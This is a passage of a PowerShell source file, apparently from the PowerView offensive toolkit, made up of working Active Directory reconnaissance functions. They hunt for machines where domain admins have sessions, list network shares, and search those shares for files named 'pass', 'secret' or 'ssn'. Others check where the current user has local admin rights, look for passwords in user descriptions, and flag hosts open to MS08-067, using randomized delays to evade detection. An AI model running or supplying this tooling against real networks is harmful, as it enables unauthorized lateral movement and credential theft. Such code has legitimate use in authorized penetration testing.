        # use the local domain
        $targetDomain = Get-NetDomain
    }

    # the array for our initial status output messages
    $statusOutput = @()

    $statusOutput += "`r`n[*] Running UserHunter on domain $targetDomain with delay of $Delay"

    # if we're using a host list, read the targets in and add them to the target list
    if($HostList -ne ""){
        $servers = @()
        if (Test-Path $HostList){
            foreach ($Item in Get-Content $HostList) {
                if (($Item -ne $null) -and ($Item.trim() -ne "")){
                    $servers += $Item
                }
            }
        }
        else {
            Write-Warning "`r`n[!] Input file '$HostList' doesn't exist!`r`n"
            $statusOutput += "`r`n[!] Input file '$HostList' doesn't exist!`r`n"
            return $statusOutput
        }
    }
    else{
        # otherwise, query the domain for target servers
        $statusOutput += "[*] Querying domain $targetDomain for hosts...`r`n"
        $servers = Get-NetComputers -Domain $targetDomain
    }

    # randomize the server array if specified
    if ($shuffle){
        $servers = Get-ShuffledArray $servers
    }

    # if we get a specific username, only use that
    if ($UserName -ne ""){
        $statusOutput += "`r`n[*] Using target user '$UserName'..."
        $TargetUsers += $UserName.ToLower()
    }
    else{
        # read in a target user list if we have one
        if($UserList -ne ""){
            $TargetUsers = @()
            # make sure the list exists
            if (Test-Path $UserList){
                foreach ($Item in Get-Content $UserList) {
                    if (($Item -ne $null) -and ($Item.trim() -ne "")){
                        $TargetUsers += $Item
                    }
                }     
            }
            else {
                Write-Warning "`r`n[!] Input file '$UserList' doesn't exist!`r`n"
                $statusOutput += "`r`n[!] Input file '$UserList' doesn't exist!`r`n"
                return $statusOutput
            }
        }
        else{
            # otherwise default to the group name to query for target users
            $statusOutput += "`r`n[*] Querying domain group '$GroupName' for target users..."
            $temp = Get-NetGroup -GroupName $GroupName -Domain $targetDomain
            # lower case all of the found usernames
            $TargetUsers = $temp | % {$_.ToLower() }
        }
    }

    if (($TargetUsers -eq $null) -or ($TargetUsers.Count -eq 0)){
        Write-Warning "`r`n [!] No users found to search for!"
        $statusOutput += "`r`n [!] No users found to search for!"
        return $statusOutput
    }

    if (($servers -eq $null) -or ($servers.Count -eq 0)){
        Write-Warning "`r`n[!] No hosts found!"
        $statusOutput += "`r`n[!] No hosts found!"
        return $statusOutput
    }

    $serverCount = $servers.count
    $statusOutput += "`r`n[*] Enumerating $serverCount servers..."

    # write out the current status output
    $statusOutput
    $counter = 0

    foreach ($server in $servers){

        $counter = $counter + 1

        # start a new status output array for each server
        $serverOutput = @()

        # make sure we get a server name
        if ($server -ne ""){
            # sleep for our semi-randomized interval
            Start-Sleep $randNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)

            Write-Verbose "[*] Enumerating server $server ($counter of $($servers.count))"
            
            # optionally check if the server is up first
            $up = $true
            if($ping){
                $up = Test-Server -Server $server
            }
            if ($up){
                # get active sessions and see if there's a target user there
                $sessions = Get-NetSessions -HostName $server
                foreach ($session in $sessions) {
                    $username = $session.sesi10_username
                    $cname = $session.sesi10_cname
                    $activetime = $session.sesi10_time
                    $idletime = $session.sesi10_idle_time

                    # make sure we have a result
                    if (($username -ne $null) -and ($username.trim() -ne "")){
                        # if the session user is in the target list, display some output
                        if ($TargetUsers -contains $username){
                            $ip = Get-HostIP -hostname $server
                            $serverOutput += "[+] Target user '$username' has a session on $server ($ip) from $cname"

                            # see if we're checking to see if we have local admin access on this machine
                            if ($CheckAccess.IsPresent){
                                if (Invoke-CheckLocalAdminAccess -Hostname $cname){
                                    $serverOutput += "[+] Current user '$CurrentUser' has local admin access on $cname !"
                                }
                            }
                        }
                    }
                }

                # get any logged on users and see if there's a target user there
                $users = Get-NetLoggedon -HostName $server
                foreach ($user in $users) {
                    $username = $user.wkui1_username
                    $domain = $user.wkui1_logon_domain

                    if (($username -ne $null) -and ($username.trim() -ne "")){
                        # if the session user is in the target list, display some output
                        if ($TargetUsers -contains $username){
                            $ip = Get-HostIP -hostname $server
                            # see if we're checking to see if we have local admin access on this machine
                            $serverOutput += "[+] Target user '$username' logged into $server ($ip)"

                            # see if we're checking to see if we have local admin access on this machine
                            if ($CheckAccess.IsPresent){
                                if (Invoke-CheckLocalAdminAccess -Hostname $ip){
                                    $serverOutput += "[+] Current user '$CurrentUser' has local admin access on $ip !"
                                }
                            }
                        }
                    }
                }
            }
        }
        # return/output this server's status array
        $serverOutput
    }
}


function Invoke-StealthUserHunter {
    <#
    .SYNOPSIS
    Finds where users are logged into by checking the sessions
    on common file servers.

    Author: @harmj0y
    
    .DESCRIPTION
    This function issues one query on the domain to get users of a target group,
    issues one query on the domain to get all user information, extracts the 
    homeDirectory for each user, creates a unique list of servers used for 
    homeDirectories (i.e. file servers), and runs Get-NetSessions against the target 
    servers. Found users are compared against the users queried from the domain group,
    or pulled from a pre-populated user list. Significantly less traffic is generated 
    on average compared to Invoke-UserHunter, but not as many hosts are covered.

    .PARAMETER GroupName
    Group name to query for target users.

    .PARAMETER UserName
    Specific username to search for.

    .PARAMETER UserList
    List of usernames to search for.

    .PARAMETER Shuffle
    Shuffle the file server list before before enumerating.

    .PARAMETER CheckAccess
    Check if the current user has local admin access to found machines.

    .PARAMETER Ping
    Ping each host to ensure it's up before enumerating.

    .PARAMETER Delay
    Delay between enumerating fileservers, defaults to 0

    .PARAMETER Jitter
    Jitter for the fileserver delay, defaults to +/- 0.3

    .PARAMETER Domain
    Domain to query for users file server locations.

    .EXAMPLE
    > Invoke-StealthUserHunter
    Finds machines on the local domain where domain admins have sessions from.

    .EXAMPLE
    > Invoke-StealthUserHunter -Domain testing
    Finds machines on the 'testing' domain where domain admins have sessions from.

    .EXAMPLE
    > Invoke-StealthUserHunter -UserList users.txt
    Finds machines on the local domain where users from a specified list have
    sessions from.

    .EXAMPLE
    > Invoke-StealthUserHunter -CheckAccess
    Finds machines on the local domain where domain admins have sessions from
    and checks if the current user has local administrator access to those 
    found machines.

    .EXAMPLE
    > Invoke-StealthUserHunter -GroupName "Power Users" -Delay 60
    Find machines on the domain where members of the "Power Users" groups  
    have sessions with a 60 second (+/- *.3) randomized delay between 
    touching each file server.

    .EXAMPLE
    > Invoke-StealthUserHunter -UserName jsmith -CheckAccess
    Find machines on the domain where jsmith has a session from and checks if 
    the current user has local administrator access to those found machines.

    .LINK
    harmj0y.net
    #>

    [CmdletBinding()]
    param(
        [string]$GroupName = "Domain Admins",
        [string]$UserName = "",
        [Parameter(Mandatory = $False)] [Switch] $CheckAccess,
        [Parameter(Mandatory = $False)] [Switch] $Ping,
        [Parameter(Mandatory = $False)] [Switch] $Shuffle,
        [UInt32]$Delay = 0,
        [UInt32]$Jitter = .3,
        [string]$HostList = "",
        [string]$UserList = "",
        [string]$Domain
    )

    If ($PSBoundParameters['Debug']) {
        $DebugPreference = 'Continue'
    }

    # users we're going to be searching for
    $TargetUsers = @()

    # resulting file servers to query
    $FileServers = @()

    # random object for delay
    $randNo = New-Object System.Random

    # get the current user
    $CurrentUser = Get-NetCurrentUser

    # get the target domain
    if($Domain){
        $targetDomain = $Domain
    }
    else{
        # use the local domain
        $targetDomain = Get-NetDomain
    }

    # the array for our initial status output messages
    $statusOutput = @()

    $statusOutput += "`r`n[*] Running StealthUserHunter on domain $targetDomain with delay of $Delay"

    # if we get a specific username, only use that
    if ($UserName -ne ""){
        $statusOutput +=  "`r`n[*] Using target user '$UserName'..."
        $TargetUsers += $UserName.ToLower()
    }
    else{
        # read in a target user list if we have one
        if($UserList -ne ""){
            $TargetUsers = @()
            # make sure the list exists
            if (Test-Path $UserList){
                foreach ($Item in Get-Content $UserList) {
                    if (($Item -ne $null) -and ($Item.trim() -ne "")){
                        $TargetUsers += $Item
                    }
                }     
            }
            else {
                Write-Warning "`r`n[!] Input file '$UserList' doesn't exist!`r`n" 
                $statusOutput +=  "`r`n[!] Input file '$UserList' doesn't exist!`r`n" 
                return $statusOutput
            }
        }
        else{
            # otherwise default to the group name to query for target users
            $statusOutput += "`r`n[*] Querying domain group '$GroupName' for target users..."
            $temp = Get-NetGroup -GroupName $GroupName -Domain $targetDomain
            # lower case all of the found usernames
            $TargetUsers = $temp | % {$_.ToLower() }
        }
    }

    if (($TargetUsers -eq $null) -or ($TargetUsers.Count -eq 0)){
        Write-Warning "`r`n [!] No users found to search for!"
        $statusOutput += "`r`n [!] No users found to search for!"
        return $statusOutput
    }

    # get the file server list
    [Array]$FileServers  = Get-NetFileServers -Domain $targetDomain

    # randomize the fileserver array if specified
    if ($shuffle){
        [Array]$FileServers = Get-ShuffledArray $FileServers
    }

    # error checking
    if (($FileServers -eq $null) -or ($FileServers.count -eq 0)){
        $statusOutput += "`r`n[!] No fileservers found in user home directories!"
        return $statusOutput
    }
    else{

        $n = $FileServers.count
        $statusOutput += "[*] Found "+$n+" fileservers`n"

        # return/output the current status lines
        $statusOutput
        $counter = 0

        # iterate through each target file server
        foreach ($server in $FileServers){

            $counter = $counter + 1

            Write-Verbose "[*] Enumerating file server $server ($counter of $($FileServers.count))"

            # start a new status output array for each server
            $serverOutput = @()

            # sleep for our semi-randomized interval
            Start-Sleep $randNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)

            # optionally check if the server is up first
            $up = $true
            if($ping){
                $up = Test-Server -Server $server
            }
            if ($up){
                # grab all the sessions for this fileserver
                $sessions = Get-NetSessions $server
                
                # search through all the sessions for a target user
                foreach ($session in $sessions) {
                    Write-Debug "[*] Session: $session"
                    # extract fields we care about
                    $username = $session.sesi10_username
                    $cname = $session.sesi10_cname
                    $activetime = $session.sesi10_time
                    $idletime = $session.sesi10_idle_time

                    # make sure we have a result
                    if (($username -ne $null) -and ($username.trim() -ne "")){
                        # if the session user is in the target list, display some output
                        if ($TargetUsers -contains $username){
                            $ip = Get-HostIP -hostname $server
                            $serverOutput += "[+] Target user '$username' has a session on $server ($ip) from $cname"

                            # see if we're checking to see if we have local admin access on this machine
                            if ($CheckAccess.IsPresent){
                                Start-Sleep $randNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)
                                if (Invoke-CheckLocalAdminAccess -Hostname $server){
                                    $serverOutput += "[+] Current user '$CurrentUser' has local admin access on $server !"
                                }
                                if (Invoke-CheckLocalAdminAccess -Hostname $cname){
                                    $serverOutput += "[+] Current user '$CurrentUser' has local admin access on $cname !"
                                }
                            }
                        }
                    }
                }
            }
            # return/output this server's status array
            $serverOutput
        }
    }
}


function Invoke-ShareFinder {
    <#
    .SYNOPSIS
    Finds (non-standard) shares on machines in the domain.

    Author: @harmj0y
    
    .DESCRIPTION
    This function finds the local domain name for a host using Get-NetDomain,
    queries the domain for all active machines with Get-NetComputers, then for 
    each server it lists of active shares with Get-NetShare. Non-standard shares 
    can be filtered out with -Exclude* flags.

    .PARAMETER HostList
    List of hostnames/IPs to search.

    .PARAMETER ExcludeStandard
    Exclude standard shares from display (C$, IPC$, print$ etc.)

    .PARAMETER ExcludePrint
    Exclude the print$ share

    .PARAMETER ExcludeIPC
    Exclude the IPC$ share

    .PARAMETER CheckShareAccess
    Only display found shares that the local user has access to.

    .PARAMETER Ping
    Ping each host to ensure it's up before enumerating.

    .PARAMETER Delay
    Delay between enumerating hosts, defaults to 0

    .PARAMETER Jitter
    Jitter for the host delay, defaults to +/- 0.3

    .PARAMETER Domain
    Domain to query for machines.

    .EXAMPLE
    > Invoke-ShareFinder
    Find shares on the domain.
    
    .EXAMPLE
    > Invoke-ShareFinder -ExcludeStandard
    Find non-standard shares on the domain.

    .EXAMPLE
    > Invoke-ShareFinder -Delay 60
    Find shares on the domain with a 60 second (+/- *.3) 
    randomized delay between touching each host.

    .EXAMPLE
    > Invoke-UserHunter -HostList hosts.txt
    Find shares for machines in the specified hostlist.

    .LINK
    harmj0y.net
    #>

    [CmdletBinding()]
    param(
        [string]$HostList = "",
        [Parameter(Mandatory = $False)] [Switch] $ExcludeStandard,
        [Parameter(Mandatory = $False)] [Switch] $ExcludePrint,
        [Parameter(Mandatory = $False)] [Switch] $ExcludeIPC,
        [Parameter(Mandatory = $False)] [Switch] $Ping,
        [Parameter(Mandatory = $False)] [Switch] $CheckShareAccess,
        [UInt32]$Delay = 0,
        [UInt32]$Jitter = .3,
        [String]$Domain
    )

    If ($PSBoundParameters['Debug']) {
        $DebugPreference = 'Continue'
    }

    # figure out the shares we want to ignore
    [String[]] $excludedShares = @("")

    if ($ExcludePrint.IsPresent){
        $excludedShares = $excludedShares + "PRINT$"
    }
    if ($ExcludeIPC.IsPresent){
        $excludedShares = $excludedShares + "IPC$"
    }
    if ($ExcludeStandard.IsPresent){
        $excludedShares = @("", "ADMIN$", "IPC$", "C$", "PRINT$")
    }

    # random object for delay
    $randNo = New-Object System.Random

    # get the current user
    $CurrentUser = Get-NetCurrentUser

    # get the target domain
    if($Domain){
        $targetDomain = $Domain
    }
    else{
        # use the local domain
        $targetDomain = Get-NetDomain
    }

    Write-Verbose "[*] Running ShareFinder on domain $targetDomain with delay of $Delay"

    # if we're using a host list, read the targets in and add them to the target list
    if($HostList -ne ""){
        $servers = @()
        if (Test-Path $HostList){
            foreach ($Item in Get-Content $HostList) {
                if (($Item -ne $null) -and ($Item.trim() -ne "")){
                    $servers += $Item
                }
            }
        }
        else {
            Write-Warning "`r`n[!] Input file '$HostList' doesn't exist!`r`n"
            return $null
        }
    }
    else{
        # otherwise, query the domain for target servers
        Write-Verbose "[*] Querying domain $targetDomain for hosts...`r`n"
        $servers = Get-NetComputers -Domain $targetDomain
    }

    # randomize the server list
    $servers = Get-ShuffledArray $servers

    if (($servers -eq $null) -or ($servers.Count -eq 0)){
        Write-Warning "`r`n[!] No hosts found!"
        return $null
    }
    else{

        # return/output the current status lines
        $counter = 0

        foreach ($server in $servers){

            $counter = $counter + 1

            Write-Verbose "[*] Enumerating server $server ($counter of $($servers.count))"

            if ($server -ne ""){
                # sleep for our semi-randomized interval
                Start-Sleep $randNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)

                # optionally check if the server is up first
                $up = $true
                if($ping){
                    $up = Test-Server -Server $server
                }
                if($up){
                    # get the shares for this host and display what we find
                    $shares = Get-NetShare -HostName $server
                    foreach ($share in $shares) {
                        Write-Debug "[*] Server share: $share"
                        $netname = $share.shi1_netname
                        $remark = $share.shi1_remark
                        $path = "\\"+$server+"\"+$netname

                        # make sure we get a real share name back
                        if (($netname) -and ($netname.trim() -ne "")){
                            
                            # skip this share if it's in the exclude list
                            if ($excludedShares -notcontains $netname.ToUpper()){
                                # see if we want to check access to this share
                                if($CheckShareAccess){
                                    # check if the user has access to this path
                                    try{
                                        $f=[IO.Directory]::GetFiles($path)
                                        "\\$server\$netname `t- $remark"
                                    }
                                    catch {}
                                }
                                else{
                                    "\\$server\$netname `t- $remark"
                                }
                            } 

                        }

                    }
                }

            }

        }
    }
}


function Invoke-FileFinder {
    <#
    .SYNOPSIS
    Finds sensitive files on the domain.

    .DESCRIPTION
    This function finds the local domain name for a host using Get-NetDomain,
    queries the domain for all active machines with Get-NetComputers, grabs
    the readable shares for each server, and recursively searches every
    share for files with specific keywords in the name.
    If a share list is passed, EVERY share is enumerated regardless of
    other options.

    .PARAMETER HostList
    List of hostnames/IPs to search.

    .PARAMETER ShareList
    List if \\HOST\shares to search through.

    .PARAMETER Terms
    Terms to search for.

    .PARAMETER OfficeDocs
    Search for office documents (*.doc*, *.xls*, *.ppt*)

    .PARAMETER FreshEXES
    Find .EXEs accessed within the last week.

    .PARAMETER AccessDateLimit
    Only return files with a LastAccessTime greater than this date value.

    .PARAMETER WriteDateLimit
    Only return files with a LastWriteTime greater than this date value.

    .PARAMETER CreateDateLimit
    Only return files with a CreationDate greater than this date value.

    .PARAMETER IncludeC
    Include any C$ shares in recursive searching (default ignore).

    .PARAMETER IncludeAdmin
    Include any ADMIN$ shares in recursive searching (default ignore).

    .PARAMETER ExcludeFolders
    Exclude folders from the search results.

    .PARAMETER ExcludeHidden
    Exclude hidden files and folders from the search results.

    .PARAMETER CheckWriteAccess
    Only returns files the current user has write access to.

    .PARAMETER OutFile
    Output results to a specified csv output file.

    .PARAMETER Ping
    Ping each host to ensure it's up before enumerating.

    .PARAMETER Delay
    Delay between enumerating hosts, defaults to 0

    .PARAMETER Jitter
    Jitter for the host delay, defaults to +/- 0.3

    .PARAMETER Domain
    Domain to query for machines

    .EXAMPLE
    > Invoke-FileFinder
    Find readable files on the domain with 'pass', 'sensitive', 
    'secret', 'admin', 'login', or 'unattend*.xml' in the name,
    
    .EXAMPLE
    > Invoke-FileFinder -Domain testing
    Find readable files on the 'testing' domain with 'pass', 'sensitive', 
    'secret', 'admin', 'login', or 'unattend*.xml' in the name,
    
    .EXAMPLE
    > Invoke-FileFinder -IncludeC 
    Find readable files on the domain with 'pass', 'sensitive', 
    'secret', 'admin', 'login' or 'unattend*.xml' in the name, 
    including C$ shares.

    .EXAMPLE
    > Invoke-FileFinder -Ping -Terms payroll,ceo
    Find readable files on the domain with 'payroll' or 'ceo' in
    the filename and ping each machine before share enumeration.

    .EXAMPLE
    > Invoke-FileFinder -ShareList shares.txt -Terms accounts,ssn -OutFile out.csv
    Enumerate a specified share list for files with 'accounts' or
    'ssn' in the name, and write everything to "out.csv"

    .LINK
    http://www.harmj0y.net/blog/redteaming/file-server-triage-on-red-team-engagements/
    #>

    [CmdletBinding()]
    param(
        [string]$HostList = "",
        [string]$ShareList = "",
        [Parameter(Mandatory = $False)] [Switch] $OfficeDocs,
        [Parameter(Mandatory = $False)] [Switch] $FreshEXES,
        $Terms,
        $AccessDateLimit = "1/1/1970",
        $WriteDateLimit = "1/1/1970",
        $CreateDateLimit = "1/1/1970",
        [Parameter(Mandatory = $False)] [Switch] $IncludeC,
        [Parameter(Mandatory = $False)] [Switch] $IncludeAdmin,
        [Switch] $ExcludeFolders,
        [Switch] $ExcludeHidden,
        [Switch] $CheckWriteAccess,
        [string] $OutFile,
        [Parameter(Mandatory = $False)] [Switch] $Ping,
        [UInt32]$Delay = 0,
        [UInt32]$Jitter = .3,
        [string]$Domain
    )

    If ($PSBoundParameters['Debug']) {
        $DebugPreference = 'Continue'
    }

    # figure out the shares we want to ignore
    [String[]] $excludedShares = @("C$", "ADMIN$")

    # see if we're specifically including any of the normally excluded sets
    if ($IncludeC.IsPresent){
        if ($IncludeAdmin.IsPresent){
            $excludedShares = @()
        }
        else{
            $excludedShares = @("ADMIN$")
        }
    }
    if ($IncludeAdmin.IsPresent){
        if ($IncludeC.IsPresent){
            $excludedShares = @()
        }
        else{
            $excludedShares = @("C$")
        }
    }

     # delete any existing output file if it already exists
    If ($OutFile -and (Test-Path $OutFile)){ Remove-Item $OutFile }

    # if we are passed a share list, enumerate each with appropriate options, then return
    if($ShareList -ne ""){
        if (Test-Path $ShareList){
            foreach ($Item in Get-Content $ShareList) {
                if (($Item -ne $null) -and ($Item.trim() -ne "")){

                    # exclude any "[tab]- commants", i.e. the output from Invoke-ShareFinder
                    $share = $Item.Split("`t")[0]

                    # get just the share name from the full path
                    $shareName = $share.split("\")[3]

                    $cmd = "Invoke-SearchFiles -Path $share $(if($Terms){`"-Terms $($Terms -join ',')`"}) $(if($ExcludeFolders){`"-ExcludeFolders`"}) $(if($ExcludeHidden){`"-ExcludeHidden`"}) $(if($FreshEXES){`"-FreshEXES`"}) $(if($OfficeDocs){`"-OfficeDocs`"}) $(if($CheckWriteAccess){`"-CheckWriteAccess`"}) $(if($OutFile){`"-OutFile $OutFile`"})"

                    Write-Verbose "[*] Enumerating share $share"
                    IEX $cmd    
                }
            }
        }
        else {
            Write-Warning "`r`n[!] Input file '$ShareList' doesn't exist!`r`n"
            return $null
        }
        return
    }

    # random object for delay
    $randNo = New-Object System.Random

    # get the target domain
    if($Domain){
        $targetDomain = $Domain
    }
    else{
        # use the local domain
        $targetDomain = Get-NetDomain
    }

    Write-Verbose "[*] Running FileFinder on domain $targetDomain with delay of $Delay"

    # if we're using a host list, read the targets in and add them to the target list
    if($HostList -ne ""){
        $servers = @()
        if (Test-Path $HostList){
            foreach ($Item in Get-Content $HostList) {
                if (($Item -ne $null) -and ($Item.trim() -ne "")){
                    $servers += $Item
                }
            }
        }
        else {
            Write-Warning "`r`n[!] Input file '$HostList' doesn't exist!`r`n"
            return $null
        }
    }
    else{
        # otherwise, query the domain for target servers
        Write-Verbose "[*] Querying domain $targetDomain for hosts...`r`n"
        $servers = Get-NetComputers -Domain $targetDomain
    }

    # randomize the server list
    $servers = Get-ShuffledArray $servers

    if (($servers -eq $null) -or ($servers.Count -eq 0)){
        Write-Warning "`r`n[!] No hosts found!"
        return $null
    }
    else{

        # return/output the current status lines
        $counter = 0

        foreach ($server in $servers){

            $counter = $counter + 1

            Write-Verbose "[*] Enumerating server $server ($counter of $($servers.count))"

            # start a new status output array for each server
            $serverOutput = @()

            if ($server -ne ""){
                # sleep for our semi-randomized interval
                Start-Sleep $randNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)

                # optionally check if the server is up first
                $up = $true
                if($ping){
                    $up = Test-Server -Server $server
                }
                if($up){
                    # get the shares for this host and display what we find
                    $shares = Get-NetShare -HostName $server
                    foreach ($share in $shares) {
                        Write-Debug "[*] Server share: $share"
                        $netname = $share.shi1_netname
                        $remark = $share.shi1_remark
                        $path = "\\"+$server+"\"+$netname

                        # make sure we get a real share name back
                        if (($netname) -and ($netname.trim() -ne "")){
                            
                            # skip this share if it's in the exclude list
                            if ($excludedShares -notcontains $netname.ToUpper()){

                                # check if the user has access to this path
                                try{
                                    $f=[IO.Directory]::GetFiles($path)

                                    $cmd = "Invoke-SearchFiles -Path $path $(if($Terms){`"-Terms $($Terms -join ',')`"}) $(if($ExcludeFolders){`"-ExcludeFolders`"}) $(if($OfficeDocs){`"-OfficeDocs`"}) $(if($ExcludeHidden){`"-ExcludeHidden`"}) $(if($FreshEXES){`"-FreshEXES`"}) $(if($CheckWriteAccess){`"-CheckWriteAccess`"}) $(if($OutFile){`"-OutFile $OutFile`"})"

                                    Write-Verbose "[*] Enumerating share $path"

                                    IEX $cmd
                                }
                                catch {}

                            } 

                        }

                    }
                }

            }

        }
    }
}


function Invoke-FindLocalAdminAccess {
    <#
    .SYNOPSIS
    Finds machines on the local domain where the current user has
    local administrator access.

    Idea stolen from the local_admin_search_enum post module in 
    Metasploit written by:
        'Brandon McCann "zeknox" <bmccann[at]accuvant.com>'
        'Thomas McCarthy "smilingraccoon" <smilingraccoon[at]gmail.com>'
        'Royce Davis "r3dy" <rdavis[at]accuvant.com>'

    Powershell module author: @harmj0y
    
    .DESCRIPTION
    This function finds the local domain name for a host using Get-NetDomain,
    queries the domain for all active machines with Get-NetComputers, then for 
    each server it checks if the current user has local administrator
    access using Invoke-CheckLocalAdminAccess.

    .PARAMETER HostList
    List of hostnames/IPs to search.

    .PARAMETER Delay
    Delay between enumerating hosts, defaults to 0

    .PARAMETER Ping
    Ping each host to ensure it's up before enumerating.
    
    .PARAMETER Jitter
    Jitter for the host delay, defaults to +/- 0.3
    
    .PARAMETER Domain
    Domain to query for machines

    .EXAMPLE
    > Invoke-FindLocalAdminAccess
    Find machines on the local domain where the current user has local 
    administrator access.

    .EXAMPLE
    > Invoke-FindLocalAdminAccess -Domain testing
    Find machines on the 'testing' domain where the current user has 
    local administrator access.

    .EXAMPLE
    > Invoke-FindLocalAdminAccess -Delay 60
    Find machines on the local domain where the current user has local administrator
    access with a 60 second (+/- *.3) randomized delay between touching each host.

    .EXAMPLE
    > Invoke-UserHunter -HostList hosts.txt
    Find which machines in the host list the current user has local 
    administrator access.

    .LINK
    https://github.com/rapid7/metasploit-framework/blob/master/modules/post/windows/gather/local_admin_search_enum.rb
    #>

    [CmdletBinding()]
    param(
        [string]$HostList = "",
        [Parameter(Mandatory = $False)] [Switch] $Ping,
        [UInt32]$Delay = 0,
        [UInt32]$Jitter = .3,
        [string]$Domain
    )

    If ($PSBoundParameters['Debug']) {
        $DebugPreference = 'Continue'
    }

    # the array for our initial status output messages
    $statusOutput = @()

    $statusOutput += "`r`n[*] Running FindLocalAdminAccess on domain $domain with delay of $Delay"

    # get the current user
    $CurrentUser = Get-NetCurrentUser

    # random object for delay
    $randNo = New-Object System.Random

    # get the target domain
    if($Domain){
        $targetDomain = $Domain
    }
    else{
        # use the local domain
        $targetDomain = Get-NetDomain
    }

    # if we're using a host list, read the targets in and add them to the target list
    if($HostList -ne ""){
        $servers = @()
        if (Test-Path $HostList){
            foreach ($Item in Get-Content $HostList) {
                if (($Item -ne $null) -and ($Item.trim() -ne "")){
                    $servers += $Item
                }
            }
        }
        else {
            Write-Warning "`r`n[!] Input file '$HostList' doesn't exist!`r`n"
            $statusOutput += "`r`n[!] Input file '$HostList' doesn't exist!`r`n"
            return $statusOutput
        }
    }
    else{
        # otherwise, query the domain for target servers
        $statusOutput += "[*] Querying domain $targetDomain for hosts...`r`n"
        $servers = Get-NetComputers -Domain $targetDomain
    }

    # randomize the server list
    $servers = Get-ShuffledArray $servers

    if (($servers -eq $null) -or ($servers.Count -eq 0)){
        Write-Warning "`r`n[!] No hosts found!"
        $statusOutput += "`r`n[!] No hosts found!"
        return $statusOutput
    }
    else{

        $statusOutput += "[*] Checking hosts for local admin access...`r`n"
        $statusOutput

        $counter = 0

        foreach ($server in $servers){

            $counter = $counter + 1

            Write-Verbose "[*] Enumerating server $server ($counter of $($servers.count))"

            # start a new status output array for each server
            $serverOutput = @()

            # sleep for our semi-randomized interval
            Start-Sleep $randNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)

            $up = $true
            if($ping){
                $up = Test-Server -Server $server
            }
            if($up){
                # check if the current user has local admin access to this server
                $access = Invoke-CheckLocalAdminAccess -HostName $server
                if ($access) {
                    $ip = Get-HostIP -hostname $server
                    $serverOutput += "[+] Current user '$CurrentUser' has local admin access on $server ($ip)"
                }
            }
            # return/output this server's status array
            $serverOutput
        }
    }
}


function Invoke-UserFieldSearch {
    <#
    .SYNOPSIS
    Searches user object fields for a given word (default pass). Default
    field being searched is 'description',

    .DESCRIPTION
    This function queries all users in the domain with Get-NetUsers,
    extracts all the specified field(s) and searches for a given
    term, default "pass". Case is ignored.

    .PARAMETER Field
    User field to search in, default of "description"

    .PARAMETER Term
    Term to search for, default of "pass"

    .PARAMETER Domain
    Domain to search user fields for.

    .EXAMPLE
    > Invoke-UserFieldSearch
    Find user accounts with "pass" in the description.

    .EXAMPLE
    > Invoke-UserFieldSearch -Term info -Term backup
    Find user accounts with "backup" in the "info" field
    #>

    [CmdletBinding()]
    param(
        [string]$Field = "description",
        [string]$Term = "pass",
        [string]$Domain
    )

    if ($Domain){
        $users = Get-NetUsers -Domain $Domain
    }
    else{
        $users = Get-NetUsers
    }

    foreach ($user in $users){

        $desc = $user.($Field)

        if ($desc){
            $desc = $desc[0].ToString().ToLower()
        }
        if ( ($desc -ne $null) -and ($desc.Contains($Term.ToLower())) ){
            $u = $user.samaccountname[0]
            $out = New-Object System.Collections.Specialized.OrderedDictionary
            $out.add('User', $u)
            $out.add($Field, $desc)
            $out
        }
    }
}


function Invoke-FindVulnSystems {
    <#
    .SYNOPSIS
    Finds systems that are likely vulnerable to MS08-067

    .DESCRIPTION
    This function queries all users in the domain with Get-NetComputers,
    and extracts Windows 2000, Windows XP SP1/2, and Windows 2003 SP1 objects.

    .PARAMETER FullData
    Return full user computer objects instead of just system names (the default)

    .PARAMETER Ping
    Ping hosts and only return those that are up/responding.

    .PARAMETER Domain
    Domain to query for systems.

    .EXAMPLE
    > Invoke-FindVulnSystems
    Return the host names of systems likely vulnerable to MS08-067

    .EXAMPLE
    > Invoke-FindVulnSystems -Domain testing
    Return the host names of systems likely vulnerable to MS08-067
    on the 'testing' domain

    .EXAMPLE
    > Invoke-FindVulnSystems -FullData
    Return the full system objects likely vulnerable to MS08-067
    #>

    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $False)] [Switch] $FullData,
        [Parameter(Mandatory = $False)] [Switch] $Ping,
        [string]$Domain
    )

    # get the target domain
    if($Domain){
        $targetDomain = $Domain
    }
    else{
        # use the local domain
        $targetDomain = Get-NetDomain
    }

    # get all servers with full data in the domain
    $servers = Get-NetComputers -FullData $targetDomain

    # find any windows 2000 boxes
    $vuln2000 = $servers | where {$_.OperatingSystem -match ".*2000.*"}

    # find any windows XP boxes, excluding SP3
    $vulnXP = $servers | where {$_.OperatingSystem -match ".*XP.*" -and $_.ServicePack -notmatch ".*3.*"}

    # find any windows 2003 SP1 boxes
    $vuln2003 = $servers | where {$_.OperatingSystem -match ".*2003.*" -and $_.ServicePack -match ".*1.*"}


    if ($FullData.IsPresent){
        if($Ping.IsPresent){
            if ($vuln2000) { $vuln2000 | where { Test-Server -Server $_.HostName } }
            if ($vulnXP) { $vulnXP | where { Test-Server -Server $_.HostName } }
            if ($vuln2003) { $vuln2003 | where { Test-Server -Server $_.HostName } }
        }
        else{
            $vuln2000 
            $vulnXP
            $vuln2003
        }
    }
    else{
        if($Ping.IsPresent){
            if($vuln2000) { $vuln2000 | where {Test-Server -Server $_.HostName} | foreach {$_.HostName} }
            if($vulnXP) { $vulnXP | where {Test-Server -Server $_.HostName} | foreach {$_.HostName} }
            if($vuln2003) { $vuln2003 | where {Test-Server -Server $_.HostName} | foreach {$_.HostName} }
        }
        else {
            $vuln2000 | foreach {$_.HostName}
            $vulnXP | foreach {$_.HostName}
            $vuln2003 | foreach {$_.HostName}
        }
    }
}


function Invoke-EnumerateLocalAdmins {
    <#
    .SYNOPSIS
    Enumerates members of the local Administrators groups
    across all machines in the domain.
    
    .DESCRIPTION
    This function queries the domain for all active machines with 
    Get-NetComputers, then for each server it queries the local
    Administrators with Get-NetLocalGroup.

    .PARAMETER HostList
    List of hostnames/IPs to search.

    .PARAMETER Delay
    Delay between enumerating hosts, defaults to 0

    .PARAMETER Ping
    Ping each host to ensure it's up before enumerating.
    
    .PARAMETER Jitter
    Jitter for the host delay, defaults to +/- 0.3

